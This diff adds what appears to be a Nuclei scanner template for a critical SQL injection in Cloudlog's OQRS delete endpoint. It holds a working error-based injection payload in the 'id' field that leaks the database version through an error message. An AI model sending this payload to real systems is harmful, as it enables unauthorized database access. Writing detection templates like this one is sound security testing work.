@@ -1,0 +1,24 @@
+id: cloudlog-sqli
+
+info:
+  name: Cloudlog SQL Injection
+  author: qwtd
+  severity: critical
+  description: Cloudlog contains a SQL injection vulnerability.
+  tags: cloudlog
+
+http:
+  - raw:
+      - |
+        POST /index.php/oqrs/delete_oqrs_line HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        id=GTID_SUBSET(CONCAT((MID((IFNULL(CAST(VERSION() AS NCHAR),0x20)),1,190))),666)
+
+    matchers:
+      - type: word
+        words:
+          - "A Database Error Occurred"
